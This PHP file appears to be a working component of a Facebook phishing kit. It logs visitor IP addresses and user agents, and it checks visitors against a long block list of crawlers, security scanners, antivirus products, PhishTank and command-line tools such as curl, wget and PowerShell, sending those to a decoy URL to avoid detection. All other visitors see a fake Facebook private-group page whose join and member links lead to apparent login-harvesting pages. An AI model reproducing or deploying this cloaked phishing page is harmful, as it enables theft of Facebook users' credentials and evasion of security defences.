<?php
error_reporting(0);
ini_set('display_errors', 0);
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
      $ipaddress = $_SERVER['REMOTE_ADDR'];
    }

$useragent = $_SERVER['HTTP_USER_AGENT'];
$data = "==1{$ipaddress}== ==2{$useragent}== ==3Facebook==";

require_once("../shadow.php");
$dp =  strtolower($_SERVER['HTTP_USER_AGENT']);
$blocked_words = array(
     "bot",
     "above",
     "google",
     "docomo",
     "mediapartners",
     "phantomjs",
     "lighthouse",
     "reverseshorturl",
     "samsung-sgh-e250",
     "softlayer",
     "amazonaws",
     "cyveillance",
     "crawler",
     "gsa-crawler",
     "phishtank",
     "dreamhost",
     "netpilot",
     "calyxinstitute",
     "tor-exit",
     "apache-httpclient",
     "lssrocketcrawler",
     "crawler",
     "urlredirectresolver",
     "jetbrains",
     "spam",
     "windows 95",
     "windows 98",
     "acunetix",
     "netsparker",
     "007ac9",
     "008",
     "Feedfetcher",
     "192.comagent",
     "200pleasebot",
     "360spider",
     "4seohuntbot",
     "50.nu",
     "a6-indexer",
     "admantx",
     "amznkassocbot",
     "aboundexbot",
     "aboutusbot",
     "abrave spider",
     "accelobot",
     "acoonbot",
     "addthis.com",
     "adsbot-google",
     "ahrefsbot",
     "alexabot",
     "amagit.com",
     "analytics",
     "antbot",
     "apercite",
     "aportworm",
     "EBAY",
     "CL0NA",
     "jabber",
     "ebay",
     "arabot",
     "hotmail!",
     "msn!",
     "baidu",
     "outlook!",
     "outlook",
     "msn",
     "duckduckbot",
     "hotmail",
     "go-http-client",
     "go-http-client/1.1",
     "trident",
     "presto",
     "virustotal",
     "unchaos",
     "dreampassport",
     "sygol",
     "nutch",
     "privoxy",
     "zipcommander",
     "neofonie",
     "abacho",
     "acoi",
     "acoon",
     "adaxas",
     "agada",
     "aladin",
     "alkaline",
     "amibot",
     "anonymizer",
     "aplix",
     "aspseek",
     "avant",
     "baboom",
     "anzwers",
     "anzwerscrawl",
     "crawlconvera",
     "del.icio.us",
     "camehttps",
     "annotate",
     "wapproxy",
     "translate",
     "feedfetcher",
     "ask24",
     "asked",
     "askaboutoil",
     "fangcrawl",
     "amzn_assoc",
     "bingpreview",
     "dr.web",
     "drweb",
     "bilbo",
     "blackwidow",
     "sogou",
     "sogou-test-spider",
     "exabot",
     "externalhit",
     "ia_archiver",
     "googletranslate",
     "translate",
     "proxy",
     "dalvik",
     "quicklook",
     "seamonkey",
     "sylera",
     "safebrowsing",
     "safesurfingwidget",
     "preview",
     "whatsapp",
     "telegram",
     "instagram",
     "zteopen",
     "icoreservice",
     "untrusted",
     "facebook",
    "abot",
    "dbot",
    "ebot",
    "hbot",
    "kbot",
    "lbot",
    "mbot",
    "nbot",
    "obot",
    "pbot",
    "rbot",
    "sbot",
    "tbot",
    "vbot",
    "ybot",
    "zbot",
    "bot.",
    "bot/",
    "_bot",
    ".bot",
    "/bot",
    "-bot",
    ":bot",
    "(bot",
    "crawl",
    "slurp",
    "spider",
    "seek",
    "avg",
    "avira",
    "bitdefender",
    "kaspersky",
    "sophos",
    "virustotal",
    "virus",
    "accoona",
    "acoon",
    "adressendeutschland",
    "ah-ha.com",
    "ahoy",
    "altavista",
    "ananzi",
    "anthill",
    "appie",
    "arachnophilia",
    "arale",
    "araneo",
    "aranha",
    "architext",
    "aretha",
    "arks",
    "asterias",
    "atlocal",
    "atn",
    "atomz",
    "augurfind",
    "backrub",
    "bannana_bot",
    "baypup",
    "bdfetch",
    "big brother",
    "biglotron",
    "bjaaland",
    "blackwidow",
    "blaiz",
    "blog",
    "blo.",
    "bloodhound",
    "boitho",
    "booch",
    "bradley",
    "butterfly",
    "calif",
    "cassandra",
    "ccubee",
    "cfetch",
    "charlotte",
    "churl",
    "cienciaficcion",
    "cmc",
    "collective",
    "comagent",
    "combine",
    "computingsite",
    "csci",
    "curl",
    "cusco",
    "daumoa",
    "deepindex",
    "delorie",
    "depspid",
    "deweb",
    "die blinde kuh",
    "digger",
    "ditto",
    "dmoz",
    "docomo",
    "download express",
    "dtaagent",
    "dwcp",
    "ebiness",
    "ebingbong",
    "e-collector",
    "ejupiter",
    "emacs-w3 search engine",
    "esther",
    "evliya celebi",
    "ezresult",
    "falcon",
    "felix ide",
    "ferret",
    "fetchrover",
    "fido",
    "findlinks",
    "fireball",
    "fish search",
    "fouineur",
    "funnelweb",
    "gazz",
    "gcreep",
    "genieknows",
    "getterroboplus",
    "geturl",
    "glx",
    "goforit",
    "golem",
    "grabber",
    "grapnel",
    "gralon",
    "griffon",
    "gromit",
    "grub",
    "gulliver",
    "hamahakki",
    "harvest",
    "havindex",
    "helix",
    "heritrix",
    "hku www octopus",
    "homerweb",
    "htdig",
    "html index",
    "html_analyzer",
    "htmlgobble",
    "hubater",
    "hyper-decontextualizer",
    "ia_archiver",
    "ibm_planetwide",
    "ichiro",
    "iconsurf",
    "iltrovatore",
    "image.kapsi.net",
    "imagelock",
    "incywincy",
    "indexer",
    "infobee",
    "informant",
    "ingrid",
    "inktomisearch.com",
    "inspector web",
    "intelliagent",
    "internet shinchakubin",
    "ip3000",
    "iron33",
    "israeli-search",
    "ivia",
    "jack",
    "jakarta",
    "javabee",
    "jetbot",
    "jumpstation",
    "katipo",
    "kdd-explorer",
    "kilroy",
    "knowledge",
    "kototoi",
    "kretrieve",
    "labelgrabber",
    "lachesis",
    "larbin",
    "legs",
    "libwww",
    "linkalarm",
    "link validator",
    "linkscan",
    "lockon",
    "lwp",
    "lycos",
    "magpie",
    "mantraagent",
    "mapoftheinternet",
    "marvin/",
    "mattie",
    "mediafox",
    "mediapartners",
    "mercator",
    "merzscope",
    "microsoft url control",
    "minirank",
    "miva",
    "mj12",
    "mnogosearch",
    "moget",
    "monster",
    "moose",
    "motor",
    "multitext",
    "muncher",
    "muscatferret",
    "mwd.search",
    "myweb",
    "najdi",
    "nameprotect",
    "nationaldirectory",
    "nazilla",
    "ncsa beta",
    "nec-meshexplorer",
    "nederland.zoek",
    "netcarta webmap engine",
    "netmechanic",
    "netresearchserver",
    "netscoop",
    "newscan-online",
    "nhse",
    "nokia6682/",
    "nomad",
    "noyona",
    "siteexplorer",
    "nutch",
    "nzexplorer",
    "objectssearch",
    "occam",
    "omni",
    "open text",
    "openfind",
    "openintelligencedata",
    "orb search",
    "osis-project",
    "pack rat",
    "pageboy",
    "pagebull",
    "page_verifier",
    "panscient",
    "parasite",
    "partnersite",
    "patric",
    "pear.",
    "pegasus",
    "peregrinator",
    "pgp key agent",
    "phantom",
    "phpdig",
    "picosearch",
    "piltdownman",
    "pimptrain",
    "pinpoint",
    "pioneer",
    "piranha",
    "plumtreewebaccessor",
    "pogodak",
    "poirot",
    "pompos",
    "poppelsdorf",
    "poppi",
    "popular iconoclast",
    "psycheclone",
    "publisher",
    "python",
    "rambler",
    "raven search",
    "roach",
    "road runner",
    "roadhouse",
    "robbie",
    "robofox",
    "robozilla",
    "rules",
    "salty",
    "sbider",
    "scooter",
    "scoutjet",
    "scrubby",
    "search.",
    "searchprocess",
    "semanticdiscovery",
    "senrigan",
    "sg-scout",
    "shai'hulud",
    "shark",
    "shopwiki",
    "sidewinder",
    "sift",
    "silk",
    "simmany",
    "site searcher",
    "site valet",
    "sitetech-rover",
    "skymob.com",
    "sleek",
    "smartwit",
    "sna-",
    "snappy",
    "snooper",
    "sohu",
    "speedfind",
    "sphere",
    "sphider",
    "spinner",
    "spyder",
    "steeler/",
    "suke",
    "suntek",
    "supersnooper",
    "surfnomore",
    "sven",
    "sygol",
    "szukacz",
    "tach black widow",
    "tarantula",
    "templeton",
    "/teoma",
    "t-h-u-n-d-e-r-s-t-o-n-e",
    "theophrastus",
    "titan",
    "titin",
    "tkwww",
    "toutatis",
    "t-rex",
    "tutorgig",
    "twiceler",
    "twisted",
    "ucsd",
    "udmsearch",
    "url check",
    "updated",
    "vagabondo",
    "valkyrie",
    "verticrawl",
    "victoria",
    "vision-search",
    "volcano",
    "voyager/",
    "voyager-hc",
    "w3c_validator",
    "w3m2",
    "w3mir",
    "walker",
    "wallpaper",
    "wanderer",
    "wauuu",
    "wavefire",
    "web core",
    "web hopper",
    "web wombat",
    "webbandit",
    "webcatcher",
    "webcopy",
    "webfoot",
    "weblayers",
    "weblinker",
    "weblog monitor",
    "webmirror",
    "webmonkey",
    "webquest",
    "webreaper",
    "websitepulse",
    "websnarf",
    "webstolperer",
    "webvac",
    "webwalk",
    "webwatch",
    "webwombat",
    "webzinger",
    "wget",
    "whizbang",
    "whowhere",
    "wild ferret",
    "worldlight",
    "wwwc",
    "wwwster",
    "xenu",
    "xget",
    "xift",
    "xirq",
    "yandex",
    "yanga",
    "yeti",
    "yodao",
    "zao/",
    "zippp",
    "zyborg",
    "proximic",
    "Googlebot",
    "Baiduspider",
    "Cliqzbot",
    "A6-Indexer",
    "AhrefsBot",
    "Genieo",
    "BomboraBot",
    "CCBot",
    "URLAppendBot",
    "DomainAppender",
    "msnbot-media",
    "Antivirus",
    "YoudaoBot",
    "MJ12bot",
    "linkdexbot",
    "Go-http-client",
    "presto",
    "BingPreview",
    "go-http-client",
     "go-http-client/1.1",
     "trident",
     "presto",
     "virustotal",
     "unchaos",
     "dreampassport",
     "sygol",
     "nutch",
     "privoxy",
     "zipcommander",
     "neofonie",
     "abacho",
     "acoi",
     "acoon",
     "adaxas",
     "agada",
     "aladin",
     "alkaline",
     "amibot",
     "anonymizer",
     "aplix",
     "aspseek",
     "avant",
     "baboom",
     "anzwers",
     "anzwerscrawl",
     "crawlconvera",
     "del.icio.us",
     "camehttps",
     "annotate",
     "wapproxy",
     "translate",
     "feedfetcher",
     "ask24",
     "asked",
     "askaboutoil",
     "fangcrawl",
     "amzn_assoc",
     "bingpreview",
     "dr.web",
     "drweb",
     "bilbo",
     "blackwidow",
     "sogou",
     "sogou-test-spider",
     "exabot",
     "externalhit",
     "ia_archiver",
     "mj12",
     "okhttp",
     "simplepie",
     "curl",
     "wget",
     "virus",
     "pipes",
     "antivirus",
     "python",
     "ruby",
     "avast",
     "firebird",
     "scmguard",
     "adsbot",
     "weblight",
     "favicon",
     "analytics",
     "insights",
     "headless",
     "github",
     "node",
     "agusescan",
     "zteopen",
     "majestic12",
     "SimplePie",
     "SAMSUNG-SGH-E250",
     "DoCoMo/2.0 N905i",
     "SiteLockSpider",
     "okhttp/2.5.0",
     "ips-agent",
     "scoutjet",
     "UptimeRobot",
     "FM Scene",
     "Prevx",
     "WindowsPowerShell"

);
    foreach($blocked_words as $word2) {
        if (substr_count($dp, strtolower($word2)) > 0 or $dp == "" or $dp == " " or $dp == "    ") {
              header("Location: ".$ShadowUrl);
              exit();
        }
    }
$sendhits = "../../view.txt";
$x = fopen($sendhits, "a+");
fwrite($x, $data);
fclose($x);
?>
<html>
 <head>
  <title>নোয়াখাইল্লা রঙ্গ private group | Facebook</title>
  <meta name="viewport" content="width=device-width">
  <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
  <meta name="theme-color" content="#3b5998">
  <style type="text/css">/*<![CDATA[*/.p{padding:5px;}.p .t .x{color:#000;}.p .t:hover .x{color:#fff;}.p .t:hover{background-color:#3b5998;}.n #groupInfoDescription{margin-top:0;}.o{background:#dddfe2;}.bg{background:#fff;}.b .q{border:0;border-collapse:collapse;margin:0;padding:0;width:100%;}.b .q tbody{vertical-align:top;}.b .r>tr>td,.b .r>tbody>tr>td,.b .q td.r{vertical-align:middle;}.b .q td{padding:0;}.b .q td.u{padding:2px;}.b .q td.bi{padding:4px;}.b .s{width:100%;}.b a,.b a:visited{color:#3b5998;text-decoration:none;}.b a:focus,.b a:hover{background-color:#3b5998;color:#fff;}.b .u{padding:2px;}.b .bi{padding:4px;}.l{border:0;display:inline-block;vertical-align:top;}i.l u{position:absolute;width:0;height:0;overflow:hidden;}.ba{color:#4b4f56;}.z{font-size:12px;line-height:16px;}.ca{font-weight:bold;}.w{text-align:center;}.bb{border:solid 2px;cursor:pointer;margin:0;padding:2px 6px 3px;text-align:center;}.bb.bd{display:block;}button.bd,input.bd{width:100%;}.bc,.i .bs,.b a.bc,.b .i a.bs{background:#f3f4f5;border-color:#ccc #aaa #999;color:#505c77;}.i .bc,.bs,.b .i a.bc,.b a.bs,.b a.bs:visited{background:#3b5998;border-color:#8a9ac5 #29447E #1a356e;color:#fff;}.bb .l{pointer-events:none;}.bb{display:inline-block;}.bb+.bb{margin-left:3px;}.bd+.bd{margin-left:0;margin-top:6px;}.bb input{background:none;border:none;margin:0;padding:0;}.bc input,.i .bs input{color:#505c77;}.i .bc input,.bs input{color:#fff;}.bl{position:absolute;width:100%;z-index:4;}.i{background-color:#3b5998;}.bm{border-top:none;padding-top:12px;}.bn{padding-top:12px;position:relative;}.bm .bo{position:absolute;}.bm .bp{left:50%;margin-left:-27px;top:0;}.bq{border-color:transparent;border-image:url(https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yn/r/OVEVu5JFsUe.png) 18 23 26;border-style:solid;border-width:18px 23px 26px;pointer-events:auto;}.bm .br{margin-top:-8px;}.be{border-bottom:1px solid #bfc3ca;}.bf{background:#f5f6f7;color:#90949c;display:block;font-size:small;font-weight:normal;padding:3px 4px;text-transform:uppercase;}.bh>*,.bh.bh>*{border-bottom:1px solid #e5e5e5;}.bh>:last-child{border-bottom:none;}.bh+.bh{border-top:1px solid #e5e5e5;}.bj{background:#d8dfea;color:#3b5998;font-weight:bold;padding:0 2px 2px 3px;}.cb{color:#fff;}.bk{font-size:small;}body,tr,input,textarea,.f{font-size:medium;}body{text-align:left;direction:ltr;}body,tr,input,textarea,button{font-family:sans-serif;}body,p,figure,h1,h2,h3,h4,h5,h6,ul,ol,li,dl,dd,dt{margin:0;padding:0;}h1,h2,h3,h4,h5,h6{font-size:1em;font-weight:bold;}ul,ol{list-style:none;}article,aside,figcaption,figure,footer,header,nav,section{display:block;}.e{background:#dadde1;}#page{position:relative;}.k{padding-bottom:4px;padding-top:4px;}.j{padding:2px 3px;}.bx{display:block;font-size:x-small;margin:-3px -3px 1px -3px;padding:3px;}.bz{border:1px solid #90949c;display:block;font-size:x-large;height:20px;line-height:18px;text-align:center;width:20px;}.b .bu input,.b .bu input:visited,.b .bu a,.b .bu a:visited{color:#bec3c9;}.b .bu input:focus,.b .bu input:hover,.b .bu a:focus,.b .bu a:hover{background:#dadde1;color:#1d2129;}.bt{background-color:#444950;font-size:x-small;padding:7px 8px 8px;}.bw{color:#bec3c9;display:block;font-size:x-small;margin:-3px -3px 1px -3px;padding:3px;}/*]]>*/</style> 
  <meta http-equiv="origin-trial" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
  <meta name="description" content='🤩"বিনোদন" & "হাসির হাসপাতালঁ"🤣 has 25407 members. 👍👍Everyone take it as a fun don,t take it personally.👍👍
Be happy always &amp; Have fun🤓🤡🤠'>
  <link rel="canonical" href="https://www.facebook.com/groups/656215467816192/">
<link rel="stylesheet" type="text/css" href="style.css"/>
 </head>
 <body tabindex="0" class="b c d e">
  <div class="f">
   <div id="viewport">
    <div class="g h">
     <div class="i j" role="banner" id="header">
      <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
      <a href="group-login.html"><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y8/r/k97pj8-or6s.png?_nc_x=Ij3Wp8lg5Kz" width="77" height="16" class="k l" alt="facebook"></a>
     </div>
    </div>
    <div id="objects_container">
     <div class="m e" id="root" role="main">
      <div class="n">
       <div id="groupMallNotices"></div>
       <div class="o p">
        <table class="q r" role="presentation">
         <tbody>
          <tr>
           <td class="s"><a href="#groupMenuBottom">
             <table class="q r t" role="presentation">
              <tbody>
               <tr>
                <td class="u v"><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y1/r/SY6u2OaJZhg.png?_nc_x=Ij3Wp8lg5Kz" width="34" height="34" class="l"></td>
                <td class="u w s"><h1>
                  <div class="x y">
                  🤩"বিনোদন" & "হাসির হাসপাতালঁ"🤣
                  </div></h1>
                 <div class="z ba">
                  Private group
                 </div></td>
               </tr>
              </tbody>
             </table></a></td>
           <td class="v"></td>
          </tr>
         </tbody>
        </table>
       </div>
       <a href="log.php" class="bb bc bd">Join Group</a>
       <div></div>
       <a name="groupMenuBottom"></a>
       <div class="be">
        <h3 class="bf">Group Menu</h3>
        <ul class="bg bh">
         <li class="bi">
          <table class="q r" role="presentation">
           <tbody>
            <tr>
             <td class="s"><a href="log.php">About</a></td>
             <td class="v"></td>
            </tr>
           </tbody>
          </table></li>
         <li class="bi">
          <table class="q r" role="presentation">
           <tbody>
            <tr>
             <td class="s"><a href="#">Info</a></td>
             <td class="v"></td>
            </tr>
           </tbody>
          </table></li>
         <li class="bi">
          <table class="q r" role="presentation">
           <tbody>
            <tr>
             <td class="s"><a href="group-login.html" id="u_0_1" aria-labelledby="u_0_1 u_0_0">Members</a></td>
             <td class="v"><span class="bj bk" id="u_0_0">25407</span></td>
            </tr>
           </tbody>
          </table></li>
        </ul>
       </div>
       <div class="bl" style="display:none">
        <div class="bm">
         <div class="bn">
          <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yR/r/CjVACNCmi_H.png?_nc_x=Ij3Wp8lg5Kz" width="54" height="24" class="bo bp l">
          <div class="bq">
           <div class="br">
            <a href="#" class="bb bs bd">View Timeline</a>
            <a href="#" class="bb bs bd">Add to Group</a>
            <a href="#" class="bb bs bd">Invite to Event</a>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
      <div style="display:none"></div>
      <span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none"></span>
     </div>
    </div>
    <div class="bg">
     <div class="bt">
      <div class="bu">
       <table class="q" role="presentation">
        <tbody>
         <tr>
          <td class="s bv" style="width:50%"><b class="bw">English (UK)</b><a class="bx" href="">অসমীয়া</a><a class="bx" href="">Português (Brasil)</a></td>
          <td class="s by" style="width:50%"><a class="bx" href="">বাংলা</a><a class="bx" href="">Español</a><a class="bx" href="">
            <div class="bz">
              + 
            </div></a></td>
         </tr>
        </tbody>
       </table>
      </div>
      <span class="ca cb">Facebook ©2022</span>
     </div>
    </div>
   </div>
  </div>
 </body>
</html>
